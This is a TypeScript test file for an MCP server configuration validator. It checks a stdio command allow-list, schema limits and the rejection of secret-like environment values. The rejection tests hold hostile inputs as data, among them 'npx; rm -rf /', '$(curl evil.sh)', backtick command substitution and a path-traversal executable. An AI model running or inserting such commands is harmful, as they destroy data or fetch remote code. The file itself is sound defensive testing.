import assert from "node:assert/strict";
import test from "node:test";
import {
  isAllowedStdioCommand,
  mcpStdioServerSchema,
  validateStdioEnv,
  mcpServerConfigV2Schema,
} from "../../src/features/mcp/mcpConfig.ts";

test("stdio 命令白名单：裸名与绝对路径放行", () => {
  assert.equal(isAllowedStdioCommand("npx"), true);
  assert.equal(isAllowedStdioCommand("node"), true);
  assert.equal(isAllowedStdioCommand("/usr/local/bin/mcp-server"), true);
  assert.equal(isAllowedStdioCommand("C:\\Tools\\mcp-server.exe"), true);
  assert.equal(
    isAllowedStdioCommand("C:\\Program Files\\mcp\\server.exe"),
    true,
  );
});
test("stdio 命令白名单：注入与越权形态拒绝", () => {
  assert.equal(isAllowedStdioCommand(""), false);
  assert.equal(isAllowedStdioCommand("npx; rm -rf /"), false);
  assert.equal(isAllowedStdioCommand("$(curl evil.sh)"), false);
  assert.equal(isAllowedStdioCommand("`id`"), false);
  assert.equal(isAllowedStdioCommand("rm -rf /"), false);
  assert.equal(isAllowedStdioCommand("echo"), false);
  assert.equal(isAllowedStdioCommand("-x"), false);
  assert.equal(isAllowedStdioCommand("..\\..\\evil.exe"), false);
  assert.equal(isAllowedStdioCommand("C:\\dir\\"), false);
});
test("stdio schema：合法配置通过，空参数/非法命令拒绝", () => {
  const ok = mcpStdioServerSchema.parse({
    transport: "stdio",
    command: "npx",
    args: ["-y", "@some/mcp"],
  });
  assert.equal(ok.args.length, 2);
  assert.throws(() =>
    mcpStdioServerSchema.parse({ transport: "stdio", command: "bash" }),
  );
  assert.throws(() =>
    mcpStdioServerSchema.parse({
      transport: "stdio",
      command: "npx",
      args: [""],
    }),
  );
  assert.throws(() =>
    mcpStdioServerSchema.parse({
      transport: "stdio",
      command: "npx",
      args: ["a".repeat(201)],
    }),
  );
});
test("stdio env：疑似密钥值被拒绝写入本地配置", () => {
  const problems = validateStdioEnv(
    mcpStdioServerSchema.parse({
      transport: "stdio",
      command: "npx",
      env: { TOKEN: "sk-abcdef1234567890" },
    }),
  );
  assert.equal(problems.length, 1);
  assert.equal(
    validateStdioEnv(
      mcpStdioServerSchema.parse({
        transport: "stdio",
        command: "npx",
        env: { REGION: "us-east" },
      }),
    ).length,
    0,
  );
});
test("v2 契约：streamable_http（现状）与 stdio 均可解析，非法 transport 拒绝", () => {
  const http = mcpServerConfigV2Schema.parse({
    id: "srv",
    name: "http server",
    transport: "streamable_http",
    endpoint: "https://mcp.example.com/mcp",
    enabled: true,
  });
  assert.equal(http.transport, "streamable_http");
  const stdio = mcpServerConfigV2Schema.parse({
    transport: "stdio",
    command: "node",
    args: ["server.js"],
  });
  assert.equal(stdio.transport, "stdio");
  assert.throws(() =>
    mcpServerConfigV2Schema.parse({ transport: "websocket" }),
  );
});
